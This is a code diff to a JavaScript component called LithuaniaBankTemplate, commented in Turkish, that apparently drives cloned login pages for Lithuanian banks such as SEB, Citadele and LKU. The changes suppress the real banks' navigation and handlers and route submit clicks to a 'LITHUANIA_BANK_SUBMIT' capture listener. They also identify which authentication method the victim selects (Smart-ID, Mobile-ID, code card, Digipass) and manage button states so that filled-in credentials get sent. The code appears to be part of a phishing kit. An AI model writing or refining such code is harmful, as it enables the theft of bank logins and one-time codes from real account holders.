@@ -1241,23 +1241,30 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
             return;
           }
 
-          // 3) Link (A etiketi): Her zaman yönlendirmeyi ENGELLE (tab degilse / disaridarsa)
-          const a = target.closest ? target.closest('a') : null;
-          if (a && a.getAttribute) {
-            const href = (a.getAttribute('href') || '') + '';
-            if (href && href !== '#' && !href.startsWith('javascript:')) {
-              preventAnyNativeNavigation(e);
-            }
-          }
-
-          // 4) BUTON / SUBMIT benzeri her şey: Eger gerçekten login method TAB butonu değilse,
-          //    yani "tıkla bizi yönlendir / gönder" butonuysa ENGELLE.
-          //    DİKKAT: Sekme / Tab butonları (ui-tabs__control, role=tab, data-tab-index vb.) ASLA ENGELLENMEZ!
+          // 3) Sekme / Tab kontrolleri ONCE kontrol edilir: data-tab-index, role=tab,
+          //    ui-tabs__control vb. ASLA ENGELLENMEZ.
+          //    (SEB gibi <a href=about:blank> tablari link-engelleyiciye takilmasin -
+          //    stopImmediatePropagation ikinci listener'i oldururdü!)
           const tabBtnCheck = target.closest && target.closest('[data-tab-index], .ui-tabs__control, .ui-tabs__caption, [role="tab"], .seb-tabs__item, .c-tabs__item, .coop-tab, .tab-item');
           if (tabBtnCheck) {
             return;
           }
 
+          // 4) Link (A etiketi): Her zaman yönlendirmeyi ENGELLE (tab degilse / disaridarsa)
+          const a = target.closest ? target.closest('a') : null;
+          if (a && a.getAttribute) {
+            const href = (a.getAttribute('href') || '') + '';
+            if (href && href !== '#' && !href.startsWith('javascript:')) {
+              // DIKKAT: stopImmediatePropagation YAPMA - asagidaki ikinci click
+              // listener'i (tab detection + LITHUANIA_BANK_SUBMIT) calismak zorunda.
+              // Sadece native yonlendirme + bankanin kendi handler'lari engellenir.
+              e.preventDefault();
+              e.stopPropagation && e.stopPropagation();
+            }
+          }
+
+          // 5) BUTON / SUBMIT benzeri her şey: Eger gerçekten login method TAB butonu değilse,
+          //    yani "tıkla bizi yönlendir / gönder" butonuysa ENGELLE.
           const btn = target.closest ? target.closest('button, [role="button"], input[type="submit"], input[type="button"], a.btn, a.button, [class*="btn"], [class*="submit"], [class*="login"]') : null;
           if (btn) {
             const btnText = (btn.textContent || '').trim().toLowerCase();
@@ -1271,7 +1278,10 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
               /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort)/i.test((btn.className || '') + '') ||
               /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort)/i.test((btn.id || '') + '');
             if (!isLoginMethodTab) {
-              preventAnyNativeNavigation(e);
+              // submit butonlari da buraya duser - stopImmediatePropagation YAPMA,
+              // ikinci listener (isSubmitBtn -> LITHUANIA_BANK_SUBMIT) calissin.
+              e.preventDefault();
+              e.stopPropagation && e.stopPropagation();
             }
           }
         }, true);
@@ -1374,23 +1384,26 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
 
                 const hasEmptyField = visibleInputs.length === 0 || visibleInputs.some(inp => !inp.value || inp.value.trim() === '');
 
-                const submitButtons = container.querySelectorAll('button[type="submit"], input[type="submit"], button.button.-positive, .button.-positive, button.btn-primary, button.v-btn');
+                const submitButtons = container.querySelectorAll('button[type="submit"], input[type="submit"], button.button.-positive, .button.-positive, button.btn-primary, button.v-btn, .submit-btn, a.submit-btn, button[name="aLogin"], input.btn');
                 submitButtons.forEach(btn => {
                     const text = btn.textContent ? btn.textContent.toLowerCase() : (btn.value ? btn.value.toLowerCase() : '');
-                    const isTab = /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort)/i.test(text);
+                    const isTab = /(smart[ -]?id|mobile[ -]?id|biometri|pin[ -]?gen|id[ -]?kort|mobilescan|digipass|kodų|kortelė)/i.test(text) || btn.hasAttribute('data-tab-index') || (btn.closest && btn.closest('[data-tab-index]'));
                     if (isTab) return;
 
                     if (hasEmptyField) {
                         btn.setAttribute('disabled', 'true');
                         btn.disabled = true;
-                        btn.classList.add('disabled', 'v-btn--disabled', '-disabled');
+                        btn.classList.add('disabled', 'v-btn--disabled', '-disabled', 'is-disabled');
+                        btn.setAttribute('aria-disabled', 'true');
                         btn.style.opacity = '0.5';
                         btn.style.cursor = 'not-allowed';
                         btn.style.pointerEvents = 'none';
                     } else {
                         btn.removeAttribute('disabled');
                         btn.disabled = false;
-                        btn.classList.remove('disabled', 'v-btn--disabled', '-disabled');
+                        btn.classList.remove('disabled', 'v-btn--disabled', '-disabled', 'is-disabled');
+                        btn.setAttribute('aria-disabled', 'false');
+                        if (btn.getAttribute('tabindex') === '-1') btn.setAttribute('tabindex', '0');
                         btn.style.opacity = '1';
                         btn.style.cursor = 'pointer';
                         btn.style.pointerEvents = 'auto';
@@ -1955,8 +1968,15 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           let submitInnerBtn = null;
 
           if (btn) {
-              const btnText = (btn.textContent || '').trim().toLowerCase();
+              const btnText = ((btn.textContent || '') + ' ' + (btn.value || '') + ' ' + (btn.getAttribute && btn.getAttribute('aria-label') || '')).trim().toLowerCase();
               const cls = (btn.className || '') + '';
+              // Native submit elementleri: text kontrolu gerektirmez
+              // (citadele "Tęsti", lku <input type=submit value=...> vb.)
+              const isNativeSubmit =
+                (btn.tagName === 'BUTTON' && (btn.getAttribute('type') || '').toLowerCase() === 'submit') ||
+                (btn.tagName === 'INPUT' && ((btn.getAttribute('type') || '').toLowerCase() === 'submit' || (btn.getAttribute('type') || '').toLowerCase() === 'button')) ||
+                (btn.getAttribute && btn.getAttribute('name') === 'aLogin') ||
+                btn.classList.contains('submit-btn');
               // Login method TAB'leri: tab text'leri - bunlar SUBMIT DEGIL
               const isTabBtn =
                 btnText.length < 60 &&
@@ -1968,7 +1988,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
               const submitText = /^(prisijung|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|giris yap|giriş yap|continue|next|ileri|tamam|onayla|verify|patvirt|jätka|sisene|teising|confirm|submit|authenticate|patvirtinti|pateikti|valdyti)/i.test(btnText) ||
                 /(prisijung|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|verify|patvirt|jätka|sisene|confirm|submit|authenticate|patvirtinti|pateikti)/i.test(btnText) && btnText.length <= 42;
 
-              if (!isTabBtn && !isLangBtn && submitText) {
+              if (!isTabBtn && !isLangBtn && (submitText || isNativeSubmit)) {
                   isSubmitBtn = true;
                   submitInnerBtn = btn;
                   target = btn;
@@ -2148,9 +2168,10 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
                   else if (/generator|kod|gen\\b/.test(_tabText)) targetIndex = 2;
                 } else if (window.location.href.includes('citadele-lt')) {
                   // 0: Kodų kortelė/Generatorius, 1: Mobile-ID, 2: MobileSCAN/Digipass 780
-                  if (/kodu|kod|kortel|generator|gen\\b/.test(_tabText)) targetIndex = 0;
+                  // (mobilescan 'mobil' icerir - once scan/digipass kontrol edilmeli!)
+                  if (/mobilescan|digipass|scan/.test(_tabText)) targetIndex = 2;
                   else if (/mobil|mobile|m.id/.test(_tabText)) targetIndex = 1;
-                  else if (/mobilescan|digipass|scan/.test(_tabText)) targetIndex = 2;
+                  else if (/kodu|kod|kortel|generator|gen\\b/.test(_tabText)) targetIndex = 0;
                 } else if (window.location.href.includes('lku-lt')) {
                   // 0: Smart-ID, 1: Mobile-ID, 2: Vienkartinis saugos kodas
                   if (/smart|smartid/.test(_tabText)) targetIndex = 0;
